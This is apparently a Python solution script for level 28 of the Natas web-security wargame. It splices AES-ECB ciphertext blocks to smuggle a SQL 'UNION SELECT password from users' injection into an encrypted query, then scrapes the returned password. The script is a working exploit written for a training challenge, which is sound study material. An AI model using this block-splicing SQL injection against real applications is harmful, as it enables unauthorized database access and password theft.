import re
import urllib.parse
import base64
import math
from src.natas.base_level import NatasLevel

class Level_28(NatasLevel):

  num = 28
  explanation = "On this level, the query is encrypted with AES in ECB mode, which encrypts each 16-byte\n     block independently. We cut and paste ciphertext blocks from different encrypted inputs\n     to inject arbitrary SQL, building a UNION SELECT against the password table."

  def encrypt(self, query: str) -> bytes:
    resp = self.session.post(self.base_url, data={"query": query})
    encoded = resp.url.split("=")[1]
    return base64.b64decode(urllib.parse.unquote(encoded))

  def exploit(self) -> str:

    block_size = 16
    quote = chr(39)
    injection = 'a' * 9 + quote + " UNION SELECT password from users; #"
    blocks = math.ceil((len(injection) - 10) / block_size)

    encrypted_injection = self.encrypt(injection)
    placeholder = self.encrypt('a' * 10)

    query = (
        placeholder[:block_size*3]
        + encrypted_injection[block_size*3:block_size*3+(blocks*block_size)]
        + placeholder[block_size*3:]
    )

    resp_pass = self.session.get(
        self.base_url + "/search.php?query=" + urllib.parse.quote(base64.b64encode(query).decode())
    )
    match = re.search(r'<li>([A-Za-z0-9]{32})</li>', resp_pass.text).group(1)

    return match
